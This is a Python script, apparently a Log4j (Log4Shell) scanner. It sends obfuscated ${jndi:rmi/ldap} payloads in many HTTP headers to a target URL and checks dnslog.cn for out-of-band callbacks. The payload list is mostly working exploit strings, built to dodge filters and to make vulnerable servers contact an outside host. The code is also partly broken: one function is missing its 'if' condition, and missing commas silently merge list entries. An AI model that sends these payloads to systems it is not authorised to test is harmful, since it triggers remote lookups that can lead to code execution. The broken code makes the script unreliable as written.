import sys,os
import time
import requests
from threading import Thread
from optparse import OptionParser 


# Configure injection point: the request header that may be problematic in the http request
vulns = [
    'X-Client-IP','X-Remote-IP','X-Remote-Addr','X-Forwarded-For',
    'X-Originating-IP','User-Agent','Referer','CF-Connecting_IP',
    'Contact','X-Wap-Profile','X-Api-Version','User-Agent'
    'True-Client-IP','Originating-IP','Forwarded','Client-IP'
    'X-Real-IP','X-Client-IP'
]

def payloadList(sub):
    payloads = [
        r'${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://'+ sub +r'/}',
        r'$ {$ {:: - j} ndi: rmi: //' + sub + '/}',
        r'${jndi:rmi://'+ sub +'/}',
        r'${${lower:jndi}:${lower:rmi}://'+ sub +'/}',
        r'${${lower:${lower:jndi}}:${lower:rmi}://'+ sub +'/}',
        r'${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://'+ sub +'/}',
        r'${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://'+ sub +'/}',
        r'${${lower:jnd}${upper:i}:${lower:ldap}://'+ sub +'/}'
        r'${${upper:j}${lower:n}${lower:d}${lower:i}${lower::}${lower:l}${lower:d}${lower:a}${lower:p}${lower::}${lower:/}${lower:/}${lower:1}${lower:2}${lower:7}${lower:.}${lower:0}${lower:.}${lower:0}${lower:.}${lower:1}${lower::}${lower:1}${lower:0}${lower:9}${lower:9}${lower:/}${lower:o}${lower:b}${lower:j}://'+ sub +'/}',
        r'${j${lower:n}d${lower:i}${lower::}${lower:l}d${lower:a}p${lower::}${lower:/}/${lower:1}${lower:2}${lower:7}.${lower:0}${lower:.}${lower:0}${lower:.}${lower:1}${lower::}${lower:1}0${lower:9}${lower:9}/${lower:o}${lower:b}://'+ sub +'/}',
        r'${${nuDV:CW:yqL:dWTUHX:-j}n${obpOW:C:-d}${ll:-i}:${GI:-l}d${YRYWp:yjkg:wrsb:RajYR:-a}p://${RHe:-1}2${Qmox:dC:MB:-7}${ucP:yQH:xYtT:WCVX:-.}0.${WQRvpR:ligza:J:DSBUAv:-0}.${v:-1}:${p:KJ:-1}${Ek:gyx:klkQMP:-0}${UqY:cE:LPJtt:L:ntC:-9}${NR:LXqcg:-9}/o${fzg:rsHKT:-b}j://'+ sub +'/}',
        r'${${uPBeLd:JghU:kyH:C:TURit:-j}${odX:t:STGD:UaqOvq:wANmU:-n}${mgSejH:tpr:zWlb:-d}${ohw:Yyz:OuptUo:gTKe:BFxGG:-i}${fGX:L:KhSyJ:-:}${E:o:wsyhug:LGVMcx:-l}${Prz:-d}${d:PeH:OmFo:GId:-a}${NLsTHo:-p}${uwF:eszIV:QSvP:-:}${JF:l:U:-/}${AyEC:rOLocm:-/}${jkJFS:r:xYzF:Frpi:he:-1}${PWtKH:w:uMiHM:vxI:-2}${a:-7}${sKiDNh:ilypjq:zemKm:-.}${QYpbY:P:dkXtCk:-0}${Iwv:TmFtBR:f:PJ:-.}${Q:-0}${LX:fMVyGy:-.}${lS:Mged:X:th:Yarx:-1}${xxOTJ:-:}${JIUlWM:-1}${Mt:Wxhdp:Rr:LuAa:QLUpW:-0}${sa:kTPw:UnP:-9}${HuDQED:-9}${modEYg:UeKXl:YJAt:pAl:u:-/}${BPJYbu:miTDQJ:-o}${VLeIR:VMYlY:f:Gaso:cVApg:-b}${sywJIr:RbbDTB:JXYr:ePKz:-j}://'+ sub +'/}'
    ]
    return payloads

def getHeaders(h_key='', h_value=''):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36',
        'Connection': 'close',
        'Accept-Encoding': 'deflate',
    }
    if not h_key:
        return headers
    else:
        headers[h_key] = h_value
    return headers

def getDnslogSubdomain():
    url = 'http://www.dnslog.cn/getdomain.php?t=0.8000782430099618'
    try:
        r = requests.get(url, headers=getHeaders(), timeout=120)
        subdomain = r.text
        cookie = r.cookies
        cookie = requests.utils.dict_from_cookiejar(cookie)
        cookie = "PHPSESSID" + "=" + cookie['PHPSESSID']
        print('[*] Get subDnslog: {}\n[*] Get cookie: {}'.format(subdomain, cookie))
        dnslog = [subdomain, cookie]
        return dnslog
    except:
        print('Request error, unable to reach dnslog-getdomain')
        return 0

def checkDnslogRecord(dnslog):
    subdomain = dnslog[0]
    cookie = dnslog[1]
    url = 'http://www.dnslog.cn/getrecords.php?t=0.8000782430099610'

    try:
        r = requests.get(url, headers=getHeaders('Cookie', cookie), timeout=120, verify=False)
            print('[+] Found the problem, dnslog received the record: {}'.format(r.text))
            return 1
        else:
            return 2
    except:
        return 0

def go(vuln, payload, dnslog, url):
    r = requests.get(url, headers=getHeaders(vuln, payload), timeout=120)
    result = checkDnslogRecord(dnslog)
    if result == 1:
        print('[+] Current payload: {}: {}'.format(vuln, payload))
        os._exit(0)
    elif result == 2:
        print('[-] No problem was found in the current payload: {}: {}'.format(vuln, payload))
    else:
        print('[x] dnslog network problem, unable to reach dnslog-getrecords')

def start_url (url):
    thread_list = []
    dnslog = getDnslogSubdomain()
    payloads = payloadList(dnslog[0])

    for vuln in vulns:
        for payload in payloads:
            time.sleep(0.5)
            thread_01 = Thread(target=go, args=(vuln, payload, dnslog, url,))
            thread_01.start()
            thread_list.append(thread_01)
    for t in thread_list:
        t.join()
    print('[Summary] All payloads have been sent out, no log4j vulnerabilities have been found')


'''
    Help document
'''
def parseArgs():
    usage="python %prog -u <target url>"
    parser = OptionParser(usage)
    parser.add_option("-u", "--url", action="store", dest="url",
                    help="Enter the link to be checked")
    return parser.parse_args()

'''
    Screenplay entrance
'''
if __name__ == "__main__":
    options, _ = parseArgs()
    if options.url:
        start_url (options.url)
    elif options.url == None:
        print('Usage: python3 scan.py -u url')
